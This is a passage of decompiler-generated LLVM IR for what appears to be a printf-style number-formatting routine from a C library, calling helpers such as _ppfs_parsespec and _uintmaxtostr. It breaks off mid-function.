  %v13_8050d96 = icmp slt i32 %v2_8050d96, 0
  store i1 %v13_8050d96, i1* %sf.global-to-local, align 1
  %v1_8050d98 = icmp eq i1 %v12_8050d96, false
  %v0_805128f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8050d98, label %dec_label_pc_805128f, label %dec_label_pc_8050d9e

dec_label_pc_8050d9e:                             ; preds = %dec_label_pc_8050d96
  %v1_8050d9e = inttoptr i32 %v0_805128f.pre.pre to i32*
  %v2_8050d9e = load i32, i32* %v1_8050d9e, align 4
  %v4_8050d9e = add i32 %v2_8050d9e, %v3_8050d9e
  %v15_8050d9e = icmp slt i32 %v4_8050d9e, 0
  store i1 %v15_8050d9e, i1* %sf.global-to-local, align 1
  store i32 %v4_8050d9e, i32* %v1_8050d9e, align 4
  %v0_8050da1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050da1

dec_label_pc_8050da1:                             ; preds = %dec_label_pc_8050d76, %dec_label_pc_8050d9e
  %v0_8051287 = phi i32 [ %v0_8050d7a, %dec_label_pc_8050d76 ], [ %v0_8050da1.pre, %dec_label_pc_8050d9e ]
  %v1_8050da1 = inttoptr i32 %v0_8051287 to i8*
  %v2_8050da1 = load i8, i8* %v1_8050da1, align 1
  %v3_8050da1 = icmp eq i8 %v2_8050da1, 0
  %v4_8050da1 = icmp slt i8 %v2_8050da1, 0
  store i1 %v4_8050da1, i1* %sf.global-to-local, align 1
  br i1 %v3_8050da1, label %dec_label_pc_8051296, label %dec_label_pc_8050daa

dec_label_pc_8050daa:                             ; preds = %dec_label_pc_8050da1
  %v1_8050daa = add i32 %v0_8051287, 1
  %v2_8050daa = inttoptr i32 %v1_8050daa to i8*
  %v3_8050daa = load i8, i8* %v2_8050daa, align 1
  %v4_8050daa = add i8 %v3_8050daa, -37
  %v12_8050daa = icmp eq i8 %v4_8050daa, 0
  %v13_8050daa = icmp slt i8 %v4_8050daa, 0
  store i1 %v13_8050daa, i1* %sf.global-to-local, align 1
  store i32 %v1_8050daa, i32* %edx.global-to-local, align 4
  br i1 %v12_8050daa, label %dec_label_pc_8051287, label %dec_label_pc_8050db7

dec_label_pc_8050db7:                             ; preds = %dec_label_pc_8050daa
  %v1_8050db7 = load i32, i32* @esp, align 4
  %v2_8050db7 = add i32 %v1_8050db7, 16
  %v3_8050db7 = inttoptr i32 %v2_8050db7 to i32*
  store i32 %v1_8050daa, i32* %v3_8050db7, align 4
  %v0_8050dbb = load i32, i32* @esp, align 4
  %v1_8050dbb = add i32 %v0_8050dbb, 340
  %v2_8050dbb = inttoptr i32 %v1_8050dbb to i32*
  store i32 0, i32* %v2_8050dbb, align 4
  %v0_8050dc6 = load i32, i32* @esp, align 4
  %v1_8050dc6 = add i32 %v0_8050dc6, -12
  %v10_8050dc6 = icmp slt i32 %v1_8050dc6, 0
  store i1 %v10_8050dc6, i1* %sf.global-to-local, align 1
  %v1_8050dc9 = add i32 %v0_8050dc6, 16
  store i32 %v1_8050dc9, i32* @ebx, align 4
  %v2_8050dcd = add i32 %v0_8050dc6, -16
  %v3_8050dcd = inttoptr i32 %v2_8050dcd to i32*
  store i32 %v1_8050dc9, i32* %v3_8050dcd, align 4
  %v0_8050dce = load i32, i32* %stack_var_-364, align 4
  %v1_8050dce = inttoptr i32 %v0_8050dce to i32*
  %v2_8050dce = call i32 @_ppfs_parsespec(i32* %v1_8050dce)
  store i32 %v2_8050dce, i32* %eax.global-to-local, align 4
  %v0_8050dd3 = load i32, i32* @ebx, align 4
  %v1_8050dd3 = load i32, i32* @esp, align 4
  %v2_8050dd3 = inttoptr i32 %v1_8050dd3 to i32*
  store i32 %v0_8050dd3, i32* %v2_8050dd3, align 4
  %v0_8050dd6 = load i32, i32* %stack_var_-364, align 4
  %v1_8050dd6 = call i32 @_ppfs_setargs(i32 %v0_8050dd6)
  store i32 %v1_8050dd6, i32* %eax.global-to-local, align 4
  %v0_8050ddb = load i32, i32* @esp, align 4
  %v1_8050ddb = add i32 %v0_8050ddb, 70
  %v2_8050ddb = inttoptr i32 %v1_8050ddb to i8*
  %v3_8050ddb = load i8, i8* %v2_8050ddb, align 1
  %v4_8050ddb = zext i8 %v3_8050ddb to i32
  store i32 %v4_8050ddb, i32* @edi, align 4
  %v1_8050de0 = add i32 %v0_8050ddb, 16
  %v1_8050de3 = add i32 %v0_8050ddb, 56
  %v2_8050de3 = inttoptr i32 %v1_8050de3 to i32*
  %v3_8050de3 = load i32, i32* %v2_8050de3, align 4
  %v5_8050de3 = icmp slt i32 %v3_8050de3, 0
  store i1 %v5_8050de3, i1* %sf.global-to-local, align 1
  %v1_8050de8 = add i32 %v0_8050ddb, 112
  store i32 %v1_8050de8, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_8050de3, 1
  br i1 %tmp67, label %dec_label_pc_8050df5, label %dec_label_pc_8050dee

dec_label_pc_8050dee:                             ; preds = %dec_label_pc_8050db7
  %v2_8050dee = zext i8 %v3_8050ddb to i32
  %v3_8050dee = mul nuw nsw i32 %v2_8050dee, 12
  store i32 %v3_8050dee, i32* %eax.global-to-local, align 4
  %v2_8050df1 = add i32 %v0_8050ddb, 100
  %v3_8050df1 = add i32 %v2_8050df1, %v3_8050dee
  store i32 %v3_8050df1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050df5

dec_label_pc_8050df5:                             ; preds = %dec_label_pc_8050db7, %dec_label_pc_8050dee
  %v0_8050dfd28 = phi i32 [ %v1_8050de8, %dec_label_pc_8050db7 ], [ %v3_8050df1, %dec_label_pc_8050dee ]
  %v1_8050df5 = add i32 %v0_8050ddb, 60
  %v2_8050df5 = inttoptr i32 %v1_8050df5 to i32*
  %v3_8050df5 = load i32, i32* %v2_8050df5, align 4
  store i32 %v3_8050df5, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050e0873 = sub i32 0, %v3_8050df5
  %v10_8050e0876 = and i32 %v3_8050df5, %v2_8050e0873
  %v11_8050e0877 = icmp slt i32 %v10_8050e0876, 0
  %v13_8050e0878 = icmp slt i32 %v2_8050e0873, 0
  %v2_8050e0a79 = icmp eq i1 %v13_8050e0878, %v11_8050e0877
  br i1 %v2_8050e0a79, label %dec_label_pc_8050e0c, label %dec_label_pc_8050dfd

dec_label_pc_8050dfd:                             ; preds = %dec_label_pc_8050df5, %dec_label_pc_8050dfd
  %v0_8050e0c83 = phi i32 [ %v0_8050e0c, %dec_label_pc_8050dfd ], [ %v1_8050de0, %dec_label_pc_8050df5 ]
  %v2_8050dfd82 = phi i32 [ %v1_8050e07, %dec_label_pc_8050dfd ], [ 0, %dec_label_pc_8050df5 ]
  %v0_8050dfd81 = phi i32 [ %v1_8050e04, %dec_label_pc_8050dfd ], [ %v0_8050dfd28, %dec_label_pc_8050df5 ]
  %v3_8050dfd = mul i32 %v2_8050dfd82, 4
  %v4_8050dfd = add i32 %v3_8050dfd, 344
  %v5_8050dfd = add i32 %v4_8050dfd, %v0_8050e0c83
  %v6_8050dfd = inttoptr i32 %v5_8050dfd to i32*
  store i32 %v0_8050dfd81, i32* %v6_8050dfd, align 4
  %v0_8050e04 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050e04 = add i32 %v0_8050e04, 12
  store i32 %v1_8050e04, i32* %edx.global-to-local, align 4
  %v0_8050e07 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e07 = add i32 %v0_8050e07, 1
  %v1_8050e08.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050e07, i32* %eax.global-to-local, align 4
  %v2_8050e08 = sub i32 %v1_8050e07, %v1_8050e08.pre
  %v8_8050e08 = xor i32 %v1_8050e07, %v1_8050e08.pre
  %v9_8050e08 = xor i32 %v2_8050e08, %v1_8050e07
  %v10_8050e08 = and i32 %v9_8050e08, %v8_8050e08
  %v11_8050e08 = icmp slt i32 %v10_8050e08, 0
  %v13_8050e08 = icmp slt i32 %v2_8050e08, 0
  %v2_8050e0a = icmp eq i1 %v13_8050e08, %v11_8050e08
  %v0_8050e0c = load i32, i32* @esp, align 4
  br i1 %v2_8050e0a, label %dec_label_pc_8050e0c, label %dec_label_pc_8050dfd

dec_label_pc_8050e0c:                             ; preds = %dec_label_pc_8050dfd, %dec_label_pc_8050df5
  %v0_8050e0c.lcssa = phi i32 [ %v1_8050de0, %dec_label_pc_8050df5 ], [ %v0_8050e0c, %dec_label_pc_8050dfd ]
  %v1_8050e0c = add i32 %v0_8050e0c.lcssa, 48
  %v2_8050e0c = inttoptr i32 %v1_8050e0c to i32*
  %v3_8050e0c = load i32, i32* %v2_8050e0c, align 4
  store i32 %v3_8050e0c, i32* @ecx, align 4
  %v1_8050e10 = icmp eq i32 %v3_8050e0c, 0
  %v2_8050e10 = icmp slt i32 %v3_8050e0c, 0
  store i1 %v2_8050e10, i1* %sf.global-to-local, align 1
  %v1_8050e12 = icmp eq i1 %v1_8050e10, false
  br i1 %v1_8050e12, label %dec_label_pc_8050e3a, label %dec_label_pc_8050e14

dec_label_pc_8050e14:                             ; preds = %dec_label_pc_8050e0c
  %v1_8050e14 = inttoptr i32 %v0_8050e0c.lcssa to i32*
  %v2_8050e14 = load i32, i32* %v1_8050e14, align 4
  store i32 %v2_8050e14, i32* %eax.global-to-local, align 4
  %v1_8050e17 = ashr i32 %v2_8050e14, 31
  store i32 %v1_8050e17, i32* %edx.global-to-local, align 4
  %v2_8050e18 = add i32 %v0_8050e0c.lcssa, -4
  %v3_8050e18 = inttoptr i32 %v2_8050e18 to i32*
  store i32 %v1_8050e17, i32* %v3_8050e18, align 4
  %v0_8050e19 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e19 = add i32 %v0_8050e0c.lcssa, -8
  %v3_8050e19 = inttoptr i32 %v2_8050e19 to i32*
  store i32 %v0_8050e19, i32* %v3_8050e19, align 4
  %v1_8050e1a = add i32 %v0_8050e0c.lcssa, 32
  %v2_8050e1a = inttoptr i32 %v1_8050e1a to i32*
  %v3_8050e1a = load i32, i32* %v2_8050e1a, align 4
  %v1_8050e1e = and i32 %v3_8050e1a, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8050e1e, i32* %eax.global-to-local, align 4
  %v2_8050e23 = add i32 %v0_8050e0c.lcssa, -12
  %v3_8050e23 = inttoptr i32 %v2_8050e23 to i32*
  store i32 %v1_8050e1e, i32* %v3_8050e23, align 4
  %v1_8050e24 = add i32 %v0_8050e0c.lcssa, 344
  %v2_8050e24 = inttoptr i32 %v1_8050e24 to i32*
  %v3_8050e24 = load i32, i32* %v2_8050e24, align 4
  store i32 %v3_8050e24, i32* %eax.global-to-local, align 4
  %v1_8050e2b = inttoptr i32 %v3_8050e24 to i32*
  %v2_8050e2b = load i32, i32* %v1_8050e2b, align 4
  %v4_8050e2b = add i32 %v0_8050e0c.lcssa, -16
  %v5_8050e2b = inttoptr i32 %v4_8050e2b to i32*
  store i32 %v2_8050e2b, i32* %v5_8050e2b, align 4
  %v0_8050e2d = call i32 @_store_inttype()
  store i32 %v0_8050e2d, i32* %eax.global-to-local, align 4
  %v0_8050e32 = load i32, i32* @esp, align 4
  %v1_8050e32 = add i32 %v0_8050e32, 16
  %v7_8050e32 = icmp slt i32 %v1_8050e32, 0
  store i1 %v7_8050e32, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805127c

dec_label_pc_8050e3a:                             ; preds = %dec_label_pc_8050e0c
  %v1_8050e3a = add i32 %v3_8050e0c, -7
  %v5_8050e3a = icmp ult i32 %v3_8050e0c, 7
  %v9_8050e3a = icmp eq i32 %v1_8050e3a, 0
  %v10_8050e3a = icmp slt i32 %v1_8050e3a, 0
  store i1 %v10_8050e3a, i1* %sf.global-to-local, align 1
  %v2_8050e3d = or i1 %v5_8050e3a, %v9_8050e3a
  br i1 %v2_8050e3d, label %dec_label_pc_8050e43, label %dec_label_pc_8050fa7

dec_label_pc_8050e43:                             ; preds = %dec_label_pc_8050e3a
  %v1_8050e43 = add i32 %v3_8050e0c, 134612144
  %v2_8050e43 = inttoptr i32 %v1_8050e43 to i8*
  %v3_8050e43 = load i8, i8* %v2_8050e43, align 1
  %v4_8050e43 = sext i8 %v3_8050e43 to i32
  store i32 %v4_8050e43, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8050e4f = icmp eq i8 %v3_8050e43, 10
  %v10_8050e4f = icmp slt i8 %v3_8050e43, 10
  store i1 %v10_8050e4f, i1* %sf.global-to-local, align 1
  %v1_8050e52 = icmp eq i1 %v9_8050e4f, false
  br i1 %v1_8050e52, label %dec_label_pc_8050e72, label %dec_label_pc_8050e54

dec_label_pc_8050e54:                             ; preds = %dec_label_pc_8050e43
  %v1_8050e54 = add i32 %v0_8050e0c.lcssa, 32
  %v2_8050e54 = inttoptr i32 %v1_8050e54 to i32*
  %v3_8050e54 = load i32, i32* %v2_8050e54, align 4
  store i32 %v3_8050e54, i32* %eax.global-to-local, align 4
  %v1_8050e5a = udiv i32 %v3_8050e54, 32
  %tmp68 = urem i32 %v1_8050e5a, 2
  %tmp69 = sub nsw i32 45, %tmp68
  %v2_8050e6a = or i32 %tmp69, 128
  store i32 %v2_8050e6a, i32* %edx.global-to-local, align 4
  %v2_8050e6d = and i32 %v3_8050e54, 64
  %v3_8050e6d = icmp eq i32 %v2_8050e6d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8050e6f = icmp eq i1 %v3_8050e6d, false
  %v4_8050e6f = select i1 %v1_8050e6f, i32 %v2_8050e6a, i32 %tmp69
  store i32 %v4_8050e6f, i32* @ebx, align 4
  br label %dec_label_pc_8050e72

dec_label_pc_8050e72:                             ; preds = %dec_label_pc_8050e43, %dec_label_pc_8050e54
  %v1_8050e72 = add i32 %v3_8050e0c, -5
  %v5_8050e72 = icmp ult i32 %v3_8050e0c, 5
  %v9_8050e72 = icmp eq i32 %v1_8050e72, 0
  %v10_8050e72 = icmp slt i32 %v1_8050e72, 0
  store i1 %v10_8050e72, i1* %sf.global-to-local, align 1
  %v2_8050e75 = or i1 %v5_8050e72, %v9_8050e72
  br i1 %v2_8050e75, label %dec_label_pc_8050e77, label %dec_label_pc_8050e8f

dec_label_pc_8050e77:                             ; preds = %dec_label_pc_8050e72
  %v1_8050e77 = add i32 %v3_8050e0c, -3
  %v9_8050e77 = icmp eq i32 %v1_8050e77, 0
  %v10_8050e77 = icmp slt i32 %v1_8050e77, 0
  store i1 %v10_8050e77, i1* %sf.global-to-local, align 1
  %v1_8050e7a = icmp eq i1 %v9_8050e77, false
  br i1 %v1_8050e7a, label %dec_label_pc_8050e83, label %dec_label_pc_8050e7c

dec_label_pc_8050e7c:                             ; preds = %dec_label_pc_8050e77
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8050e91

dec_label_pc_8050e83:                             ; preds = %dec_label_pc_8050e77
  %v1_8050e83 = add i32 %v3_8050e0c, -1
  %v9_8050e83 = icmp eq i32 %v1_8050e83, 0
  %v10_8050e83 = icmp slt i32 %v1_8050e83, 0
  store i1 %v10_8050e83, i1* %sf.global-to-local, align 1
  br i1 %v9_8050e83, label %dec_label_pc_8050e96, label %dec_label_pc_8050e91

dec_label_pc_8050e8f:                             ; preds = %dec_label_pc_8050e72
  %v1_8050e8f = sub nsw i32 0, %v4_8050e43
  %v7_8050e8f = icmp sgt i8 %v3_8050e43, 0
  store i1 %v7_8050e8f, i1* %sf.global-to-local, align 1
  store i32 %v1_8050e8f, i32* @esi, align 4
  br label %dec_label_pc_8050e91

dec_label_pc_8050e91:                             ; preds = %dec_label_pc_8050e83, %dec_label_pc_8050e7c, %dec_label_pc_8050e8f
  br label %dec_label_pc_8050e96

dec_label_pc_8050e96:                             ; preds = %dec_label_pc_8050e83, %dec_label_pc_8050e91
  %storemerge = phi i32 [ 11, %dec_label_pc_8050e91 ], [ 6, %dec_label_pc_8050e83 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_8050e96 = add i32 %v0_8050e0c.lcssa, 20
  %v2_8050e96 = inttoptr i32 %v1_8050e96 to i32*
  %v3_8050e96 = load i32, i32* %v2_8050e96, align 4
  %v5_8050e96 = icmp slt i32 %v3_8050e96, 0
  store i1 %v5_8050e96, i1* %sf.global-to-local, align 1
  %v1_8050e9b = add i32 %v0_8050e0c.lcssa, 7
  %v2_8050e9b = inttoptr i32 %v1_8050e9b to i8*
  store i8 32, i8* %v2_8050e9b, align 1
  %v0_8050ea0 = load i1, i1* %sf.global-to-local, align 1
  %v1_8050ea0 = icmp eq i1 %v0_8050ea0, false
  br i1 %v1_8050ea0, label %dec_label_pc_8050eaa, label %dec_label_pc_8050ea2

dec_label_pc_8050ea2:                             ; preds = %dec_label_pc_8050e96
  %v0_8050ea2 = load i32, i32* @esp, align 4
  %v1_8050ea2 = add i32 %v0_8050ea2, 36
  %v2_8050ea2 = inttoptr i32 %v1_8050ea2 to i8*
  %v3_8050ea2 = load i8, i8* %v2_8050ea2, align 1
  %v4_8050ea2 = zext i8 %v3_8050ea2 to i32
  %v5_8050ea2 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050ea2 = and i32 %v5_8050ea2, -256
  %v7_8050ea2 = or i32 %v6_8050ea2, %v4_8050ea2
  store i32 %v7_8050ea2, i32* %edx.global-to-local, align 4
  %v3_8050ea6 = add i32 %v0_8050ea2, 7
  %v4_8050ea6 = inttoptr i32 %v3_8050ea6 to i8*
  store i8 %v3_8050ea2, i8* %v4_8050ea6, align 1
  br label %dec_label_pc_8050eaa

dec_label_pc_8050eaa:                             ; preds = %dec_label_pc_8050e96, %dec_label_pc_8050ea2
  %v1_8050eaa = add i32 %v3_8050e0c, -1
  %v8_8050eaa = icmp eq i32 %v1_8050eaa, 0
  %v9_8050eaa = icmp slt i32 %v1_8050eaa, 0
  store i1 %v9_8050eaa, i1* %sf.global-to-local, align 1
  store i32 %v1_8050eaa, i32* %ecx.global-to-local, align 4
  %v0_8050eab = load i32, i32* @esp, align 4
  %v1_8050eab = add i32 %v0_8050eab, 344
  %v2_8050eab = inttoptr i32 %v1_8050eab to i32*
  %v3_8050eab = load i32, i32* %v2_8050eab, align 4
  store i32 %v3_8050eab, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_8050ec3.pre = load i32, i32* @edi, align 4
  br i1 %v8_8050eaa, label %dec_label_pc_8050ec3, label %dec_label_pc_8050eb9

dec_label_pc_8050eb9:                             ; preds = %dec_label_pc_8050eaa
  %v2_8050eb9 = mul i32 %v0_8050ec3.pre, 4
  %v3_8050eb9 = add i32 %v0_8050eab, 52
  %v4_8050eb9 = add i32 %v3_8050eb9, %v2_8050eb9
  %v5_8050eb9 = inttoptr i32 %v4_8050eb9 to i32*
  %v6_8050eb9 = load i32, i32* %v5_8050eb9, align 4
  %v1_8050ebd = and i32 %v6_8050eb9, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8050ebd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050ec3

dec_label_pc_8050ec3:                             ; preds = %dec_label_pc_8050eaa, %dec_label_pc_8050eb9
  %v2_8050ec3 = add i32 %v0_8050eab, -4
  %v3_8050ec3 = inttoptr i32 %v2_8050ec3 to i32*
  store i32 %v0_8050ec3.pre, i32* %v3_8050ec3, align 4
  %v0_8050ec4 = load i32, i32* @esi, align 4
  %v2_8050ec4 = add i32 %v0_8050eab, -8
  %v3_8050ec4 = inttoptr i32 %v2_8050ec4 to i32*
  store i32 %v0_8050ec4, i32* %v3_8050ec4, align 4
  %v0_8050ec5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ec5 = add i32 %v0_8050eab, -12
  %v3_8050ec5 = inttoptr i32 %v2_8050ec5 to i32*
  store i32 %v0_8050ec5, i32* %v3_8050ec5, align 4
  %v0_8050ec6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050ec6 = add i32 %v0_8050eab, -16
  %v3_8050ec6 = inttoptr i32 %v2_8050ec6 to i32*
  store i32 %v0_8050ec6, i32* %v3_8050ec6, align 4
  %v0_8050ec7 = call i32 @_load_inttype()
  %v0_8050ecc = load i32, i32* @ebx, align 4
  %v1_8050ecc = load i32, i32* @esp, align 4
  %v2_8050ecc = inttoptr i32 %v1_8050ecc to i32*
  store i32 %v0_8050ecc, i32* %v2_8050ecc, align 4
  %v0_8050ecf = load i32, i32* @esi, align 4
  %v1_8050ecf = load i32, i32* @esp, align 4
  %v2_8050ecf = add i32 %v1_8050ecf, -4
  %v3_8050ecf = inttoptr i32 %v2_8050ecf to i32*
  store i32 %v0_8050ecf, i32* %v3_8050ecf, align 4
  %v0_8050ed0 = load i32, i32* @edx, align 4
  %v2_8050ed0 = add i32 %v1_8050ecf, -8
  %v3_8050ed0 = inttoptr i32 %v2_8050ed0 to i32*
  store i32 %v0_8050ed0, i32* %v3_8050ed0, align 4
  %v2_8050ed1 = add i32 %v1_8050ecf, -12
  %v3_8050ed1 = inttoptr i32 %v2_8050ed1 to i32*
  store i32 %v0_8050ec7, i32* %v3_8050ed1, align 4
  %v1_8050ed2 = add i32 %v1_8050ecf, 347
  store i32 %v1_8050ed2, i32* %eax.global-to-local, align 4
  %v2_8050ed9 = add i32 %v1_8050ecf, -16
  %v3_8050ed9 = inttoptr i32 %v2_8050ed9 to i32*
  store i32 %v1_8050ed2, i32* %v3_8050ed9, align 4
  %v0_8050eda = load i32, i32* %stack_var_-364, align 4
  %v5_8050eda = inttoptr i32 %v0_8050eda to i8*
  %v6_8050eda = call i32 @_uintmaxtostr(i8* %v5_8050eda, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8050eda, i32* %eax.global-to-local, align 4
  %v0_8050edf = load i32, i32* @esp, align 4
  %v1_8050edf = add i32 %v0_8050edf, 32
  %v1_8050ee2 = add i32 %v0_8050edf, 80
  %v2_8050ee2 = inttoptr i32 %v1_8050ee2 to i32*
  %v3_8050ee2 = load i32, i32* %v2_8050ee2, align 4
  %v4_8050ee2 = add i32 %v3_8050ee2, -5
  %v8_8050ee2 = icmp ult i32 %v3_8050ee2, 5
  %v12_8050ee2 = icmp eq i32 %v4_8050ee2, 0
  %v13_8050ee2 = icmp slt i32 %v4_8050ee2, 0
  store i1 %v13_8050ee2, i1* %sf.global-to-local, align 1
  store i32 %v6_8050eda, i32* @edi, align 4
  %v2_8050ee9 = or i1 %v8_8050ee2, %v12_8050ee2
  br i1 %v2_8050ee9, label %dec_label_pc_8050f13, label %dec_label_pc_8050eeb

dec_label_pc_8050eeb:                             ; preds = %dec_label_pc_8050ec3
  %v7_8050eda = inttoptr i32 %v6_8050eda to i8*
  %v3_8050eeb = load i8, i8* %v7_8050eda, align 1
  %v4_8050eeb = add i8 %v3_8050eeb, -45
  %v12_8050eeb = icmp eq i8 %v4_8050eeb, 0
  %v13_8050eeb = icmp slt i8 %v4_8050eeb, 0
  store i1 %v13_8050eeb, i1* %sf.global-to-local, align 1
  %v1_8050eee = icmp eq i1 %v12_8050eeb, false
  %v1_8050efd = add i32 %v0_8050edf, 64
  %v2_8050efd = inttoptr i32 %v1_8050efd to i32*
  %v3_8050efd = load i32, i32* %v2_8050efd, align 4
  br i1 %v1_8050eee, label %dec_label_pc_8050efd, label %dec_label_pc_8050ef0

dec_label_pc_8050ef0:                             ; preds = %dec_label_pc_8050eeb
  %v4_8050ef0 = or i32 %v3_8050efd, 2
  store i32 %v4_8050ef0, i32* %v2_8050efd, align 4
  %v0_8050ef5 = load i32, i32* @edi, align 4
  %v1_8050ef5 = add i32 %v0_8050ef5, 1
  %v9_8050ef5 = icmp slt i32 %v1_8050ef5, 0
  store i1 %v9_8050ef5, i1* %sf.global-to-local, align 1
  store i32 %v1_8050ef5, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8050f13.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050f13

dec_label_pc_8050efd:                             ; preds = %dec_label_pc_8050eeb
  store i32 %v3_8050efd, i32* %eax.global-to-local, align 4
  %v2_8050f01 = and i32 %v3_8050efd, 2
  %v3_8050f01 = icmp eq i32 %v2_8050f01, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_8050f01, label %dec_label_pc_8050f09, label %dec_label_pc_8050f05

dec_label_pc_8050f05:                             ; preds = %dec_label_pc_8050efd
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050f13

dec_label_pc_8050f09:                             ; preds = %dec_label_pc_8050efd
  %v2_8050f09 = urem i32 %v3_8050efd, 2
  %v3_8050f09 = icmp eq i32 %v2_8050f09, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_8050f10 = icmp eq i1 %v3_8050f09, false
  %v2_8050f10 = load i32, i32* @ebp, align 4
  %v4_8050f10 = select i1 %v1_8050f10, i32 4, i32 %v2_8050f10
  store i32 %v4_8050f10, i32* @ebp, align 4
  br label %dec_label_pc_8050f13

dec_label_pc_8050f13:                             ; preds = %dec_label_pc_8050ec3, %dec_label_pc_8050f05, %dec_label_pc_8050ef0, %dec_label_pc_8050f09
  %v0_8050f65 = phi i32 [ %v6_8050eda, %dec_label_pc_8050ec3 ], [ %v6_8050eda, %dec_label_pc_8050f05 ], [ %v1_8050ef5, %dec_label_pc_8050ef0 ], [ %v6_8050eda, %dec_label_pc_8050f09 ]
  %v0_8050f75 = phi i32 [ %v1_8050edf, %dec_label_pc_8050ec3 ], [ %v1_8050edf, %dec_label_pc_8050f05 ], [ %v0_8050f13.pre, %dec_label_pc_8050ef0 ], [ %v1_8050edf, %dec_label_pc_8050f09 ]
  %v1_8050f13 = add i32 %v0_8050f75, 20
  %v2_8050f13 = inttoptr i32 %v1_8050f13 to i32*
  %v3_8050f13 = load i32, i32* %v2_8050f13, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_8050f17 = sub i32 204, %v0_8050f65
  %v2_8050f23 = add i32 %v1_8050f17, %v0_8050f75
  %v1_8050f25 = add i32 %v2_8050f23, 127
  store i32 %v1_8050f25, i32* @esi, align 4
  %v2_8050f28 = icmp slt i32 %v3_8050f13, 0
  store i1 %v2_8050f28, i1* %sf.global-to-local, align 1
  %v3_8050f2a = select i1 %v2_8050f28, i32 1, i32 %v3_8050f13
  store i32 %v3_8050f2a, i32* %ecx.global-to-local, align 4
  %v1_8050f2d = add i32 %v0_8050f75, 32
  %v2_8050f2d = inttoptr i32 %v1_8050f2d to i8*
  %v3_8050f2d = load i8, i8* %v2_8050f2d, align 1
  %v4_8050f2d = and i8 %v3_8050f2d, 16
  %v5_8050f2d = icmp eq i8 %v4_8050f2d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_8050f2d, label %dec_label_pc_8050f65, label %dec_label_pc_8050f34

dec_label_pc_8050f34:                             ; preds = %dec_label_pc_8050f13
  %v1_8050f34 = add i32 %v0_8050f75, 48
  %v2_8050f34 = inttoptr i32 %v1_8050f34 to i32*
  %v3_8050f34 = load i32, i32* %v2_8050f34, align 4
  store i32 %v3_8050f34, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v3_8050f34, 3
  %v3_8050f3d = load i32, i32* @ebp, align 4
  %v5_8050f3d = select i1 %tmp70, i32 6, i32 %v3_8050f3d
  store i32 %v5_8050f3d, i32* @ebp, align 4
  %v1_8050f40 = add i32 %v3_8050f34, -3
  %v9_8050f40 = icmp eq i32 %v1_8050f40, 0
  %v10_8050f40 = icmp slt i32 %v1_8050f40, 0
  store i1 %v10_8050f40, i1* %sf.global-to-local, align 1
  %v1_8050f43 = icmp eq i1 %v9_8050f40, false
  br i1 %v1_8050f43, label %dec_label_pc_8050f4c, label %dec_label_pc_8050f45

dec_label_pc_8050f45:                             ; preds = %dec_label_pc_8050f34
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8050f65

dec_label_pc_8050f4c:                             ; preds = %dec_label_pc_8050f34
  %v1_8050f4c = add i32 %v3_8050f34, -4
  %v9_8050f4c = icmp eq i32 %v1_8050f4c, 0
  %v10_8050f4c = icmp slt i32 %v1_8050f4c, 0
  store i1 %v10_8050f4c, i1* %sf.global-to-local, align 1
  %v1_8050f4f = icmp eq i1 %v9_8050f4c, false
  br i1 %v1_8050f4f, label %dec_label_pc_8050f65, label %dec_label_pc_8050f51

dec_label_pc_8050f51:                             ; preds = %dec_label_pc_8050f4c
  %v2_8050f51 = sub i32 %v3_8050f2a, %v1_8050f25
  %v7_8050f51 = icmp ult i32 %v3_8050f2a, %v1_8050f25
  %v12_8050f51 = icmp eq i32 %v2_8050f51, 0
  %v13_8050f51 = icmp slt i32 %v2_8050f51, 0
  store i1 %v13_8050f51, i1* %sf.global-to-local, align 1
  %v2_8050f53 = or i1 %v7_8050f51, %v12_8050f51
  br i1 %v2_8050f53, label %dec_label_pc_8050f55, label %dec_label_pc_8050f65

dec_label_pc_8050f55:                             ; preds = %dec_label_pc_8050f51
  %v1_8050f55 = inttoptr i32 %v0_8050f65 to i8*
  %v2_8050f55 = load i8, i8* %v1_8050f55, align 1
  %v3_8050f55 = add i8 %v2_8050f55, -48
  %v8_8050f55 = icmp eq i8 %v3_8050f55, 0
  %v9_8050f55 = icmp slt i8 %v3_8050f55, 0
  store i1 %v9_8050f55, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_8050f55, label %dec_label_pc_8050f65, label %dec_label_pc_8050f5f

dec_label_pc_8050f5f:                             ; preds = %dec_label_pc_8050f55
